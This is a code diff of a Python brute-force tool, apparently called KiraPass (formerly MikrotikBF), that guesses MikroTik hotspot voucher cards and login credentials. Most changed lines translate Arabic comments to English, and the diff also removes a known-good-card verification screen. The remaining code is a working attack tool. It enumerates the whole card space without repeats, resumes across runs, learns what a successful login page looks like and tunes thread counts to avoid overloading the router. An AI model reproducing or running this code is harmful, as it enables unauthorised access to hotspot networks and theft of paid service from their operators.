@@ -18,11 +18,11 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-MAX_TRIES_PER_CARD = 3     # إعادات إضافية للكارت الواحد عند فشل الشبكة (★ v3.2)
-NET_ERR_BURST    = 25      # عدد أخطاء الاتصال المتتالية قبل اعتبار الهدف مفقوداً
-NET_SILENCE_SEC  = 6.0     # مدة الصمت الكامل (بدون أي رد HTTP) قبل الإجهاض
-SLOW_DIAG_AFTER  = 8.0     # إذا تجاوز زمن الاستجابة هذا → وسم "slow" في الفحص
-READ_TIMEOUT     = 8.0     # كان 4.0 → قصير جداً على راوتر مشغول أو RADIUS
+MAX_TRIES_PER_CARD = 3     # extra retries for one card on network-level failure (★ v3.2)
+NET_ERR_BURST    = 25      # consecutive connection errors before the target counts as lost
+NET_SILENCE_SEC  = 6.0     # total silence (no HTTP reply at all) before aborting
+SLOW_DIAG_AFTER  = 8.0     # response slower than this is tagged "slow" in diagnostics
+READ_TIMEOUT     = 8.0     # was 4.0 → too short for a busy router or a slow RADIUS
 CONNECT_TIMEOUT  = 3.0
 
 
@@ -50,7 +50,9 @@ try:
     SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 except NameError:
     SCRIPT_DIR = os.getcwd()
-DB_FILE = os.path.join(SCRIPT_DIR, 'mikrotikbf_profiles.json')
+DB_FILE = os.path.join(SCRIPT_DIR, 'kirapass_profiles.json')
+# profiles saved under the old MikrotikBF name, still readable after the rename
+LEGACY_DB_FILE = os.path.join(SCRIPT_DIR, 'mikrotikbf_profiles.json')
 
 HEADERS = {
     "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -76,7 +78,7 @@ CHARSETS = {
 }
 
 def classify_error(exc):
-    """يرجّع (kind, short_text)."""
+    """Return (kind, short_text)."""
     full = f'{type(exc).__name__}: {exc}'
     short = full if len(full) <= 160 else full[:157] + '...'
     txt = full.lower()
@@ -115,33 +117,41 @@ def classify_error(exc):
 
 
 ERROR_HINTS = {
-    'stale_keepalive': ('السيرفر قفل اتصال keep-alive معاد استخدامه — '
-                        'ليس حظراً وليس كارت منتهي (يُعاد تلقائياً)'),
-    'conn_reset':      ('الراوتر قطع الاتصال (RST) — غالباً حد أقصى '
-                        'لاتصالات سيرفر الـHTTP داخل المايكروتك'),
-    'conn_refused':    ('المنفذ مغلق — hotspot http متوقف أو قاعدة drop'),
-    'conn_timeout':    ('لا رد إطلاقاً — الواي فاي/الراوتر أو قاعدة إسقاط'),
-    'read_timeout':    ('الراوتر تأخر في الرد — تحميل زائد أو RADIUS بطيء'),
-    'connect_timeout': ('لا يمكن فتح اتصال TCP — الشبكة مقطوعة أو إسقاط'),
-    'timeout':         ('مهلة عامة'),
-    'dns':             ('تعذّر تحويل الاسم — الشبكة مقطوعة'),
-    'unreachable':     ('لا مسار للمضيف — خرجت من شبكة الـhotspot'),
-    'ssl':             ('مشكلة TLS — غالباً http ضد https'),
-    'proxy':           ('تدخّل بروكسي'),
-    'conn_error':      ('خطأ اتصال آخر'),
-    'redirect_loop':   ('حلقة redirect'),
-    'request_error':   ('خطأ طلب عام'),
-    'other':           ('استثناء غير متوقع'),
+    'stale_keepalive': ('the server closed a reused keep-alive connection — '
+                        'not a ban and not an expired card (auto-retried)'),
+    'conn_reset':      ('the router reset the connection (RST) — usually the '
+                        'Mikrotik HTTP server connection limit'),
+    'conn_refused':    ('port closed — hotspot http service stopped, or a drop rule'),
+    'conn_timeout':    ('no reply at all — Wi-Fi/router problem, or a drop rule'),
+    'read_timeout':    ('the router was late to answer — overload or slow RADIUS'),
+    'connect_timeout': ('TCP connection could not be opened — link down or dropped'),
+    'timeout':         ('generic timeout'),
+    'dns':             ('name resolution failed — the link is down'),
+    'unreachable':     ('no route to host — you left the hotspot network'),
+    'ssl':             ('TLS problem — usually http against https'),
+    'proxy':           ('proxy interference'),
+    'conn_error':      ('another connection error'),
+    'redirect_loop':   ('redirect loop'),
+    'request_error':   ('generic request error'),
+    'other':           ('unexpected exception'),
 }
 
-def load_db():
+def _read_db_file(path):
     try:
-        with open(DB_FILE, 'r', encoding='utf-8') as f:
+        with open(path, 'r', encoding='utf-8') as f:
             data = json.load(f)
         if isinstance(data, dict) and isinstance(data.get('profiles'), list):
             return data
     except (FileNotFoundError, json.JSONDecodeError, OSError):
         pass
+    return None
+
+
+def load_db():
+    for path in (DB_FILE, LEGACY_DB_FILE):
+        data = _read_db_file(path)
+        if data is not None:
+            return data
     return {'profiles': []}
 
 
@@ -175,7 +185,7 @@ def ask_yn(prompt, default_yes=False):
     raw = input(f'{prompt} {green}[{d}]{white} : ').strip().lower()
     if raw == '':
         return default_yes
-    return raw in ('y', 'yes', 'نعم', 'ي')
+    return raw in ('y', 'yes')
 
 
 def normalize_url(u):
@@ -227,9 +237,9 @@ def close_thread_session():
 
 def test_connection(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), tries=3):
     """
-    ★ v3.2: إعادة محاولة عند إغلاق الراوتر للاتصال (RemoteDisconnected).
-    كان طلب واحد فاشل عابر يُظهر 'Cannot reach target' ويوقف كل شيء
-    رغم أن الراوتر يعمل — وهذا مصدر إنذارات كاذبة.
+    ★ v3.2: retry when the router closes the connection (RemoteDisconnected).
+    A single transient failure used to print 'Cannot reach target' and stop
+    everything even though the router was fine — a source of false alarms.
     """
     last = None
     for i in range(tries):
@@ -277,9 +287,9 @@ def _raw_send(s, p, u, pw, timeout):
 def send_login(p, u, pw, session=None,
                timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), retry_stale=True):
     """
-    ★ v3.1: يعيد المحاولة مرة واحدة عند خطأ 'الاتصال القديم'.
-    هذا وحده يُسقط نسبة كبيرة من Err الوهمية في v3.0.
-    متغيّر thread-local يسجّل أن إعادة محاولة حدثت (للتقرير).
+    ★ v3.1: retry once on a 'stale connection' error.
+    This alone removes a large share of the phantom Err count seen in v3.0.
+    A thread-local flag records that a retry happened (for the report).
     """
     s = session or thread_session()
     try:
@@ -332,7 +342,7 @@ def is_successful(p, resp, keyword):
 
 
 def extract_signature(success_text, fail_text, limit=12):
-    """كلمات موجودة في صفحة النجاح وغائبة عن صفحة الفشل"""
+    """Words present on the success page and absent from the failure page"""
     fw = set(re.findall(r'[a-z]{3,}', (fail_text or '').lower()))
     seen = []
     for w in re.findall(r'[a-z]{3,}', (success_text or '').lower()):
@@ -345,8 +355,8 @@ def extract_signature(success_text, fail_text, limit=12):
 def learn_success_page(p):
     print(f'''
 {cyan} ┌─ Teach SUCCESS page ────────────────────────┐{white}
- │ {gray}سجّل الآن ببيانات صحيحة تعرفها (حتى لو تجريبية)│
- │ {gray}ستتعلم الأداة شكل صفحة النجاح تلقائياً        │{white}
+ │ {gray}Log in now with a valid credential you know{white} │
+ │ {gray}The tool learns the success page on its own{white} │
 {cyan} └─────────────────────────────────────────────┘{white}''')
 
     u = input(' Known-good Username : ').strip()
@@ -378,7 +388,7 @@ def learn_success_page(p):
     if identical:
         print(f'''{yellow}
  ⚠ Success & failure pages look IDENTICAL —
-   cannot learn. سيتم الاعتماد على /status والكلمة المفتاحية.{white}''')
+   cannot learn. Falling back to /status plus the keyword.{white}''')
         return False
 
     p['success_url'] = ok_resp.url or ''
@@ -417,11 +427,11 @@ def ask_url_and_test(p):
 def ask_method_and_fields(p):
     print(f'''{yellow}
  ┌─────────────────────────────────────────────┐
- │  1) GET  → البيانات تظهر في الرابط          │
- │  2) POST → البيانات مخفية (الأحدث)          │
+ │  1) GET  → the data shows up in the URL     │
+ │  2) POST → the data is hidden (newer)       │
  │                                             │
- │  {gray}💡 لا تعرف؟ افتح صفحة login واضغط F12{yellow}    │
- │     {gray}وابحث عن <form method="..."{yellow}             │
+ │  {gray}💡 Not sure? open the login page, hit F12{yellow}  │
+ │    {gray}and look for <form method="..."{yellow}          │
  └─────────────────────────────────────────────┘{white}''')
     c = input(f'{white} → Method {green}(1/2, Enter=1){white} : ').strip()
     p['method'] = '2' if c == '2' else '1'
@@ -440,9 +450,9 @@ def ask_method_and_fields(p):
 def ask_network_shape(p):
     print(f'''{yellow}
  ┌─────────────────────────────────────────────┐
- │  1) username فقط (كارت/كود)                 │
+ │  1) username only (card / code)             │
  │  2) username = password                     │
- │  3) username + password مختلفان            │
+ │  3) username + password (different)         │
  └─────────────────────────────────────────────┘{white}''')
     while True:
         nt = input(f'{white} → Type {green}(1/2/3){white} : ').strip()
@@ -461,7 +471,7 @@ def ask_network_shape(p):
             if var > 0:
                 p.update(charset=cs, var_len=var, prefix=pre, suffix=suf)
                 return
-            print(f'{red} ✗ Prefix+Suffix أطول من الطول كله!{white}')
+            print(f'{red} ✗ Prefix+Suffix is longer than the full length!{white}')
     else:
         for tag, key in (('username', 'u'), ('password', 'p')):
             while True:
@@ -474,7 +484,7 @@ def ask_network_shape(p):
                     p.update({f'{key}_charset': cs, f'{key}_len': var,
                               f'{key}_prefix': pre, f'{key}_suffix': suf})
                     break
-                print(f'{red} ✗ Prefix+Suffix أطول من الطول!{white}')
+                print(f'{red} ✗ Prefix+Suffix is longer than the length!{white}')
 
 
 def print_profile_summary(p):
@@ -504,12 +514,12 @@ def top_error(kinds):
     return f'{k}×{n}'
 
 def _space_size(charset, n):
-    """عدد كل الاحتمالات الممكنة = |الحروف| ^ الطول"""
+    """Number of possible combinations = |charset| ^ length"""
     return max(1, len(charset) ** int(n))
 
 
 def _decode_index(idx, charset, n):
-    """يحوّل رقم الفهرس إلى نص: bijection بين [0, space) وكل النصوص."""
+    """Turn an index into a string: bijection between [0, space) and all strings."""
     base = len(charset)
     out = []
     for _ in range(int(n)):
@@ -519,7 +529,7 @@ def _decode_index(idx, charset, n):
 
 
 def _profile_space(p):
-    """حجم فضاء الاحتمالات للبروفايل (كل الكروت/الأزواج الممكنة)."""
+    """Size of the profile search space (every possible card / pair)."""
     if p.get('network_type') in ('1', '2'):
         return _space_size(p['charset'], p['var_len'])
     return (_space_size(p['u_charset'], p['u_len'])
@@ -528,9 +538,9 @@ def _profile_space(p):
 
 def _new_walk(space):
     """
-    مشي دوري كامل: index(i) = (b + a*i) mod space
-    بشرط gcd(a, space) = 1 → يمرّ على كل فهرس مرة واحدة بالضبط
-    قبل أن يعود للبداية، وترتيبه مبعثر عشوائياً. الذاكرة O(1).
+    Full cyclic walk: index(i) = (b + a*i) mod space
+    with gcd(a, space) = 1 → every index is visited exactly once before the
+    walk returns to its start, in a randomly scattered order. Memory O(1).
     """
     rnd = random.Random()
     a = 1
@@ -544,7 +554,7 @@ def _new_walk(space):
 
 
 def get_walk(p):
-    """يرجّع (walk, space, note) ويحفظ الحالة داخل البروفايل."""
+    """Return (walk, space, note) and keep the state inside the profile."""
     space = _profile_space(p)
     w = p.get('walk')
     note = ''
@@ -562,7 +572,7 @@ def get_walk(p):
 
 
 def card_gen(p, walk, start_pos):
-    """يولّد الكروت بلا أي تكرار داخل الجولة (عكس choices القديمة)."""
+    """Yield cards with no repetition inside one pass (unlike the old choices)."""
     nt = p.get('network_type')
     a, b, space = walk['a'], walk['b'], walk['space']
     if nt in ('1', '2'):
@@ -669,7 +679,7 @@ def attack(p, count, threads_count, keyword):
         return card_gen(p, walk, start_pos)
 
     def note_response(status):
-        """رد HTTP وصل → الشبكة حيّة، نصفّر عدّاد الصمت."""
+        """An HTTP reply arrived → the link is alive, reset the silence counter."""
         with lock:
             shared['responses'] += 1
             shared['last_resp_ts'] = time.time()
@@ -702,9 +712,9 @@ def attack(p, count, threads_count, keyword):
 
     def do_attempt(u, pw):
         """
-        ★ v3.2: كارت فشل طلبه على مستوى الشبكة = لم يُجرَّب فعلاً،
-        فنعيده في نفس الـthread (retry داخلي) حتى تكون "التغطية"
-        حقيقية. الطابور المحدود كان يُسقط الإعادات عند امتلائه.
+        ★ v3.2: a card whose request failed at the network level was never really
+        tested, so it is retried inside the same thread to keep the coverage
+        number honest. The bounded queue used to drop those retries once full.
         """
         resp = None
         t0 = time.time()
@@ -772,13 +782,13 @@ def attack(p, count, threads_count, keyword):
     if walk_note:
         print(f' {cyan}↻ {walk_note}{white}')
     if capped:
-        print(f''' {yellow}⚠ الفضاء كله {fmt_int(space)} احتمال فقط — تم تحديد الجولة
-   بـ {fmt_int(effective)} محاولة لتغطية كل الاحتمالات بلا تكرار
-   (المحاولات الزائدة كانت ستكرر نفس الكروت).{white}''')
+        print(f''' {yellow}⚠ The whole space is only {fmt_int(space)} combinations — the
+   run was capped at {fmt_int(effective)} attempts so it covers every combination
+   without repeating them (extra attempts would retry the same cards).{white}''')
     if space <= 10 ** 6:
-        print(f' {green}✓ هذه الجولة تغطي '
+        print(f' {green}✓ This run covers '
               f'{min(100.0, effective / max(space - start_pos, 1) * 100):.1f}% '
-              f'من الاحتمالات المتبقية — بدون أي تكرار.{white}')
+              f'of the remaining combinations — with no repetition.{white}')
 
     t0 = time.time()
     prog = threading.Thread(target=progress_updater,
@@ -838,8 +848,8 @@ def print_error_report(shared, threads_count):
         print(f' {green}↻ {shared["retried"]} stale connections were '
               f'auto-retried (would have been counted as errors in v3.0).{white}')
     if shared.get('requeued'):
-        print(f' {green}↻ {shared["requeued"]} كارت فشل طلبه على مستوى الشبكة '
-              f'أُعيد إرساله حتى لا تُحسب تغطية وهمية.{white}')
+        print(f' {green}↻ {shared["requeued"]} cards whose requests failed at the network '
+              f'level were sent again, so coverage is not counted as fake.{white}')
 
     if shared['http_status']:
         codes = ', '.join(f'{c}×{n}' for c, n
@@ -860,52 +870,53 @@ def print_error_report(shared, threads_count):
         if kinds:
             topk = kinds.most_common(1)[0][0]
         if topk in ('read_timeout', 'connect_timeout', 'conn_timeout', 'timeout'):
-            why = (f'الهدف توقف عن الرد كلياً '
+            why = (f'the target stopped answering altogether '
                    f'({shared.get("unreachable_reason", "")}). '
-                   f'كل الأخطاء كانت مهلات → إمّا الرابط انقطع، أو الراوتر لم يعد '
-                   f'يستطيع اللحاق بـ {threads_count} thread.')
+                   f'Every error was a timeout → either the link dropped, or the '
+                   f'router can no longer keep up with {threads_count} threads.')
         else:
-            why = (f'الهدف توقف عن الرد كلياً '
+            why = (f'the target stopped answering altogether '
                    f'({shared.get("unreachable_reason", "")}). '
-                   f'الشبكة/الراوتر لم يعد يُرى — خرجت من مدى الواي فاي، أو قاعدة '
-                   f'firewall تسقط جهازك.')
+                   f'The network/router is no longer visible — you left the Wi-Fi '
+                   f'range, or a firewall rule is dropping your device.')
         print(f''' {red}✗ The target stopped answering — the run was aborted.
-   آخر خطأ: {shared["unreachable_kind"]}  |  {shared["err_since_resp"]} خطأ متتالٍ
+   Last error: {shared["unreachable_kind"]}  |  {shared["err_since_resp"]} errors in a row
    {why}
-   ليس كارت منتهي وليس كلمة مرور خاطئة. تحقّق: هل ما زلت على نفس
-   الشبكة؟ ثم أعد القياس من Menu 4 قبل أي تخمين.{white}''')
+   This is not an expired card and not a wrong password. Check: are you still on
+   the same network? Then re-measure the link with the diagnostics step before
+   guessing again.{white}''')
     elif rate >= 60 and shared['responses'] == 0:
         print(f''' {red}✗ Not a single HTTP response was received.
-   كل الطلبات فشلت على مستوى الاتصال. راجع الرابط أولاً (Menu 4)،
-   وليس الكروت.{white}''')
+   Every request failed at the connection level. Check the URL first (the
+   diagnostics step), not the cards.{white}''')
     elif kinds and kinds.most_common(1)[0][1] / max(errs, 1) >= 0.5:
         topk = kinds.most_common(1)[0][0]
         if topk in ('stale_keepalive',):
             print(f''' {yellow}▲ Most errors were stale keep-alive connections.
-   الراوتر يقفل الاتصالات المعاد استخدامها. الأثر الأصلي للخطأ صفر تقريباً
-   الآن (يُعاد تلقائياً) — لكن إن أردت تقليلها: قلّل الـThreads إلى 20-40
-   أو اجعل الهيدر Connection: close عبر إضافة صغيرة في HEADERS.{white}''')
+   The router closes reused connections. Their real impact is close to zero now
+   (they are auto-retried) — but to reduce them: lower the threads to 20-40, or
+   send the header Connection: close with a small change in HEADERS.{white}''')
         elif topk in ('read_timeout', 'conn_timeout', 'timeout'):
             rec = max(4, min(threads_count // 2, 40))
             print(f''' {yellow}▲ Errors are timeouts → the router is overloaded.
-   {threads_count} thread على راوتر بيتي = ضغط زائد، والنتيجة بطء وأخطاء
-   أكثر لا سرعة أعلى. جرّب {rec} thread وقارن (Menu 4 يعمل المقارنة
-   تلقائياً).{white}''')
+   {threads_count} threads on a home router = too much pressure: slower and
+   more errors, not faster. Try {rec} threads and compare — the diagnostics
+   step runs that comparison for you.{white}''')
         elif topk in ('conn_reset', 'conn_refused'):
             print(f''' {yellow}▲ Connections are being reset/refused by the router.
-   غالباً حد اتصالات سيرفر الـHTTP داخل المايكروتك، أو جهاز وسيط/AP.
-   جرّب threads أقل + مسافة صغيرة بين الطلبات.{white}''')
+   Usually the Mikrotik HTTP server connection limit, or a middle device / AP.
+   Try fewer threads + a small delay between requests.{white}''')
         elif topk in ('unreachable', 'dns', 'conn_error'):
-            print(f''' {red}▲ Network-level failures dominate — الشبكة غير مستقرة.
-   الأخطاء هنا ليست دليل حظر من المايكروتك، بل دليل أن المسار للراوتر
-   غير موثوق من جهازك.{white}''')
+            print(f''' {red}▲ Network-level failures dominate — the link is unstable.
+   These errors are not proof of a Mikrotik ban; they mean the path from your
+   device to the router is unreliable.{white}''')
         else:
             print(f' {yellow}▲ Top error: {topk}. '
                   f'{ERROR_HINTS.get(topk, "")}{white}')
     elif rate >= 10:
         print(f''' {yellow}▲ Error rate {rate:.1f}% is high for a healthy hotspot.
-   القاعدة العملية: أقل من 2% مقبول، 2-10% يحتاج تقليل threads،
-   أكثر من 10% يعني الشبكة أو الراوتر تحت ضغط حقيقي.{white}''')
+   Rule of thumb: under 2% is fine, 2-10% needs fewer threads, over 10% means
+   the network or the router is under real pressure.{white}''')
     else:
         print(f' {green}✓ Error rate looks healthy ({rate:.1f}%).{white}')
 
@@ -954,222 +965,58 @@ def show_result(shared, p, threads_count):
     covered = min(start + sent, space) if space else 0
     pct = (covered / space * 100.0) if space else 0.0
     print(f''' {cyan}COVERAGE{white}
-   الفضاء الكامل          : {fmt_int(space) if space else "?"} احتمال
-   موضع البداية           : {fmt_int(start)}
-   كروت مختلفة جُرّبت     : {fmt_int(sent)} (بلا أي تكرار)
-   إجمالي طلبات HTTP      : {fmt_int(shared["tested"])} (يشمل إعادة إرسال الفاشلة)
-   كروت لم يصل طلبها أبداً : {fmt_int(shared.get("failed_cards", 0))} (فشلت كل الإعادات)
-   ردود HTTP مقروءة       : {fmt_int(shared.get("responses", 0))}
-   التغطية التراكمية      : {fmt_int(covered)} / {fmt_int(space)} = {pct:.2f}%''')
+   Full search space        : {fmt_int(space) if space else "?"} combinations
+   Starting position        : {fmt_int(start)}
+   Distinct cards tested    : {fmt_int(sent)} (no repetition)
+   Total HTTP requests      : {fmt_int(shared["tested"])} (includes resent failures)
+   Cards never delivered    : {fmt_int(shared.get("failed_cards", 0))} (every retry failed)
+   HTTP replies read        : {fmt_int(shared.get("responses", 0))}
+   Cumulative coverage      : {fmt_int(covered)} / {fmt_int(space)} = {pct:.2f}%''')
     if shared.get('failed_cards'):
-        print(f' {yellow}⚠ {shared["failed_cards"]} كارت فشل إرسالها 4 مرات متتالية '
-              f'ولم تصل للراوتر — فهي غير مغطّاة فعلياً. أعد الجولة (ستُجرَّب '
-              f'ضمن الجولة القادمة) أو قلّل الـThreads لتقليل الفقد.{white}')
+        print(f' {yellow}⚠ {shared["failed_cards"]} cards failed to send 4 times in a row '
+              f'and never reached the router, so they are not really covered. Re-run '
+              f'the pass (they are tried in the next round) or lower the thread '
+              f'count to reduce losses.{white}')
 
     print_error_report(shared, threads_count)
 
     if not shared['found']:
         if space and pct >= 99.999 and shared.get('failed_cards'):
-            print(f'''{yellow} ⚠ التغطية 100% لكن {shared["failed_cards"]} كارت لم يصل
-   طلبها للراوتر أبداً — فهي ليست مغطّاة فعلياً. أعد نفس الجولة
-   (سيكمل من حيث توقف ويمرّ عليها) قبل أي استنتاج.{white}
+            print(f'''{yellow} ⚠ Coverage is 100%, but {shared["failed_cards"]} cards never
+   reached the router — so they are not really covered. Re-run the same pass
+   (it resumes where it stopped and walks over them) before concluding.{white}
 ''')
         elif space and pct >= 99.999:
             print(f'''{red} ╔══════════════════════════════════════════════════════╗
- ║  ✓ تم تجريب كل الاحتمالات الممكنة — واحدة واحدة       ║
+ ║  ✓ Every possible combination has been tested        ║
  ╚══════════════════════════════════════════════════════╝{white}
-   {white}بما أن كل الكروت الممكنة جُرّبت ولم ينجح أي منها، فالمشكلة
-   ليست في التخمين ولا في "حظ" الأرقام. الأسباب الباقية:
-     1) شكل الطلب مرفوض (باسورد مطلوب / POST بدل GET / dst-popup)
-     2) الراوتر يرفض الكارت نفسه (منتهي/غير مُنشّأ/محجوب الجهاز)
-     3) كشف النجاح لا يعمل (صفحة نجاح لا تحتوي /status)
-   {cyan} → شغّل الخيار 5 (Verify with a known-good card) الآن: يجيب
-     على الثلاثة في 9 طلبات، ولو عندك كارت صحيح واحد معروف.
-   {gray} لا داعي لتكرار الهجوم على نفس الفضاء — سيعيد نفس الاحتمالات.{white}
+   {white}Since every possible card was tried and none of them worked, the problem is
+   not the guessing and not the "luck" of the numbers. What is left:
+     1) The request shape is rejected (a password is required / POST instead of
+        GET / dst-popup missing)
+     2) The router rejects the card itself (expired / never created / device
+        ip-binding blocked)
+     3) Success detection does not work (the success page has no /status)
+   {cyan} → Run KiraPass_extras.py → option 1 (known-good card check): it
+      answers all three in 9 requests, as long as you know one valid card.
+   {gray} Attacking the same space again is pointless — it would repeat the same
+      combinations.{white}
 ''')
         elif space and pct >= 60:
-            print(f'''   {yellow}تغطية {pct:.1f}% — لم يُستنفد الفضاء بعد. أعد التشغيل بنفس
-   الإعدادات وسيكمل من {fmt_int(covered)} بدل البدء من الصفر
-   (لأنه لا يكرر ما جرّبه). أو اطلب {fmt_int(space - covered)} محاولة
-   لتغطية الباقي كاملاً.{white}
+            print(f'''   {yellow}Coverage {pct:.1f}% — the space is not exhausted yet. Re-run
+   with the same settings and it resumes from {fmt_int(covered)} instead of
+   starting over (it never repeats what it already tried). Or ask for
+   {fmt_int(space - covered)} attempts to cover the rest completely.{white}
 ''')
         else:
-            print(f'''   {yellow}جرب:{white} زيادة المحاولات • مراجعة GET/POST (F12)
-        • مراجعة طول/بادئة الكارت • تعليم صفحة النجاح
-        • أو الخيار 5: تجربة كارت صحيح معروف للتأكد من شكل الطلب
+            print(f'''   {yellow}Try:{white} more attempts • re-check GET/POST (F12)
+        • re-check the card length/prefix • teach the success page
+        • or KiraPass_extras.py (known-good card check) to confirm the shape
 ''')
-    input(f'{yellow} Press [Enter] to continue...{white}')
-
-def _shape_send(p, method, user, pw, extras):
-    """يرسل طلباً بشكل محدد دون تعديل البروفايل الأصلي."""
-    q = dict(p)
-    q['method'] = method
-    q['extras'] = extras
-    return send_login(q, user, pw, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
-
-
-def _describe_resp(resp, base):
-    """تفاصيل طلب واحد مقارنةً بصفحة الدخول الأصلية."""
-    url = resp.url or ''
-    html = resp.text or ''
-    low = html.lower()
-    fail = next((f for f in FAILURE_SIGNS if f in low), None)
-    same_path_as_base = bool(base) and same_path(url, base['url'])
-    size_same = base is not None and abs(len(html) - base['len']) <= 40
-    return {
-        'status': getattr(resp, 'status_code', 0),
-        'url': url,
-        'len': len(html),
-        'fail': fail,
-        'login_page': same_path_as_base and size_same,
-        'status_page': '/status' in url.lower(),
-        'text': html,
-    }
-
-
-def verify_flow():
-    db = load_db()
-    p = choose_profile(db)
-    if p is None:
-        return
-    idx = p.pop('__index__', None)
-
-    print(f'''{cyan}
- ┌─ Verify with a known-good card (Menu 5) ────┐
- │ {gray}عندك كارت صحيح تعرفه؟ هذه الشاشة تجرّبه   │
- │ {gray}على 8 أشكال طلب مختلفة وتقول لك بالضبط    │
- │ {gray}أين المشكلة: الشكل؟ الكشف؟ أم الكارت؟      │{white}
-{cyan} └─────────────────────────────────────────────┘{white}''')
-
-    good = input(' Known-good card/username : ').strip()
-    if not good:
-        print(f'{red} ✗ Cancelled.{white}')
-        input(f'{gray} Enter to continue...{white}')
-        return
-    pwx = input(' Password for it (Enter = same as card, "-" = none) : ').strip()
-    if pwx == '-':
-        pw_list = [None]
-    elif pwx == '':
-        pw_list = [None, good]
-    else:
-        pw_list = [pwx]
-
-    print(f'{yellow} ⟳ Fetching the plain login page (baseline)...{white}')
-    try:
-        b = test_connection(p['login_url'])
-        base = {'url': b.url or p['login_url'], 'len': len(b.text or '')}
-        print(f'{green} ✓ Baseline: HTTP {b.status_code} | {base["len"]} bytes | '
-              f'{base["url"]}{white}')
-    except Exception as e:
-        kind, short = classify_error(e)
-        print(f'{red} ✗ Cannot reach the login page [{kind}]: {short}{white}')
-        input(f'{gray} Enter to continue...{white}')
-        return
-    wrong = ''.join(choices('zqx9', k=max(6, len(good))))
-    wrong_d = None
-    try:
-        wresp = _shape_send(p, p.get('method', '1'), wrong, wrong, True)
-        wrong_d = _describe_resp(wresp, base)
-    except Exception:
-        pass
-    shapes = []
-    for method, mname in (('1', 'GET '), ('2', 'POST')):
-        for extra in (True, False):
-            tag = '+dst-popup' if extra else 'plain    '
-            shapes.append((method, extra, None, f'{mname} {tag} user-only'))
-            for v in pw_list:
-                if v:
-                    shapes.append((method, extra, v,
-                                   f'{mname} {tag} user+pass'))
-
-    print(f'\n {cyan}Testing {len(shapes)} request shapes with the '
-          f'known-good card...{white}\n')
-    print(f' {gray}{"shape":<32} {"HTTP":<5} {"size":<7} verdict{white}')
-    print(f' {gray}{"-" * 82}{white}')
-    results = []
-    for method, extra, pwv, label in shapes:
-        try:
-            r = _shape_send(p, method, good, pwv, extra)
-            d = _describe_resp(r, base)
-        except Exception as e:
-            kind, _ = classify_error(e)
-            d = {'status': 0, 'url': f'[{kind}]', 'len': 0, 'fail': None,
-                 'login_page': False, 'status_page': False, 'text': ''}
-        d.update(method=method, extra=extra, pwv=pwv, label=label)
-        if d['status_page']:
-            verdict = 'SUCCESS — redirected to /status'
-        elif d['fail']:
-            verdict = f'rejected ({d["fail"][:26]})'
-        elif d['login_page']:
-            verdict = 'login page again (no error text)'
-        elif (wrong_d and d['len'] == wrong_d['len']
-              and d['url'] == wrong_d['url']):
-            verdict = 'identical to wrong-card reply'
-        elif d['len'] != base['len']:
-            verdict = 'DIFFERENT page — inspect'
-        else:
-            verdict = 'same size as login page'
-        d['verdict'] = verdict
-        results.append(d)
-        print(f' {white}{label:<32} {d["status"]:<5} {d["len"]:<7} {verdict}{white}')
-
-    print(f'\n {cyan}VERDICT{white}')
-    winners = [d for d in results if d['status_page']]
-    differs = [d for d in results
-               if not d['status_page'] and not d['login_page'] and not d['fail']
-               and d['len'] != base['len']]
-    rejected_all = all((d['fail'] or d['login_page']) for d in results)
-
-    if winners:
-        w = winners[0]
-        print(f''' {green}✓ شكل الطلب الصحيح: {w["label"].strip()}
-   الراوتر قبل الكارت وحوّلك إلى صفحة /status → كشف النجاح يعمل،
-   ومعنى ذلك أن فشلك السابق كان تغطية ناقصة للأرقام فقط
-   (تكرار الكروت) — وهو ما أصلحته النسخة 3.2.{white}''')
-    elif differs:
-        d = differs[0]
-        print(f''' {yellow}▲ لا تحويل إلى /status، لكن الرد على الكارت الصحيح
-   مختلف فعلاً عن صفحة الدخول ({d["len"]} بايت بدل {base["len"]}).
-   أي أن الطلب نجح والراوتر أعاد صفحة نجاح بشكل مختلف (JS/Popup)،
-   وكشف النجاح عندك لا يعرفها → لهذا لم يظهر MATCH FOUND.{white}''')
-        print(f' {gray}   final URL: {d["url"]}{white}')
-    elif rejected_all:
-        print(f''' {red}✗ كل الأشكال الثمانية رفضت الكارت الصحيح نفسه.
-   هذا يعني أن المشكلة ليست في الأداة ولا في شكل الطلب، بل أحد:
-     1) الكارت منتهي أو لم يُنشأ/يُفعّل بعد في الراوتر
-     2) جهازك محجوب (ip-binding blocked) أو الراوتر لا يقبل تسجيلاً جديداً
-     3) الرابط ليس صفحة دخول الـhotspot الصحيحة
-   {gray}   افتح صفحة الدخول في المتصفح وسجّل بالكارت يدوياً:
-   إن رُفض في المتصفح أيضاً → المشكلة في الكارت/الشبكة لا في الأداة.{white}''')
-    else:
-        print(f''' {yellow}▲ الردود لا تُظهر نجاحاً ولا رفضاً واضحاً.
-   راجع أن الكارت الصحيح مكتوب صحيحاً وأن الرابط هو صفحة الدخول فعلاً.{white}''')
-    learn_src = winners[0] if winners else (differs[0] if differs else None)
-    if learn_src and idx is not None:
-        print(f'''\n {cyan}يمكن الآن تعليم الأداة صفحة النجاح من هذا الرد
-   (بدل الاعتماد على /status وحدها — أدق بكثير).{white}''')
-        if ask_yn(' → Apply this shape + learn the success page?',
-                  default_yes=True):
-            prof = db['profiles'][idx]
-            prof['method'] = learn_src['method']
-            prof['extras'] = learn_src['extra']
-            prof['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M')
-            sig = extract_signature(learn_src['text'],
-                                    wrong_d['text'] if wrong_d else '')
-            if sig:
-                prof['success_signature'] = sig
-            if learn_src['url']:
-                prof['success_url'] = learn_src['url']
-            if save_db(db):
-                print(f' {green}✓ Saved: '
-                      f'method={"POST" if learn_src["method"] == "2" else "GET"}, '
-                      f'extras={learn_src["extra"]}, signature={len(sig)} words'
-                      f'{white}')
-
     input(f'{yellow} Press [Enter] to continue...{white}')
 
 def _probe(p, n, threads_count, label):
-    """يرسل n محاولة ببيانات خاطئة (لا يخمّن شيئاً) ويقيس فقط."""
+    """Send n requests with deliberately wrong data (guesses nothing), just measuring."""
     lock = threading.Lock()
     stop_event = threading.Event()
     stats = {'n': 0, 'err': 0, 'kinds': Counter(), 'codes': Counter(),
